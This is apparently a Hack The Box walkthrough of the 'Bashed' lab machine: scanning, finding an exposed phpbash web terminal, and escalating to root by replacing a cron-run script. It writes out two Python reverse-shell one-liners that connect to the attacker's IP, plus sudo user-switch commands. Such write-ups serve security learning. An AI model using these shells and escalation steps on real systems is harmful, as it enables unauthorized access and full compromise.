---
title: "Bashed [HTB Walkthrough]"
date: 2022-04-27T19:08:29+08:00
draft: false
tags: ["HTB", "Easy"]
---

---

### Knowledge Gained 🙉
- su 


---

## Enumeration

First, we start off with a `rustscan `scan, seems that this box only have one open port which is port `80`.

```
rustscan -a 10.10.10.68
```

![](../../img/bash1.png)

I then move to the website and nothing much was on the website.

![](../../img/bash2.png)

Then, I run `gobuster` to search for sub-directories under this server. The results returns a few interesting results: `/php` , `/dev` , `/uploads`

![](../../img/bash3.png)

---

## Foothold

Both `/php` and `/uploads` have nothing inside, so I move on to `/dev`. Under this there is a php file called `phpbash.php`, and it appears to be a terminal. I can access the terminal using the `www-data` user and the user flag is just there for us.

![](../../img/bash4.png)

Before I proceed, I upgraded the shell to have more control of the machine. The shell I used is from [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
![](../../img/bash5.png)

---

## Priv Esc

After moving around the terminal, I run `sudo -l` to see what privileges we have. Seems like the `www-data` user can run commands as `scriptmanager` user. 

```
sudo -u scriptmanager /bin/bash
```

![](../../img/bash6.png)

![](../../img/bash7.png)

After poking around, I noticed that there is a folder under the root directory named `scripts` that is owned by the **scriptmanager** user.


![](../../img/bash8.png)

Under that folder there is a **script** and a **text** file. Seems like the script is opening and writing to the file. Noticing the creation time of the text file, I know that there must be some **cron** running the script in the background automatically every minute.

![](../../img/bash9.png)

So next all we have to do is replace the script with a reverse shell and we are root!

```
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.13\",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > test.py
```

![](../../img/bash10.png)

Thats all for this box, thanks for reading!






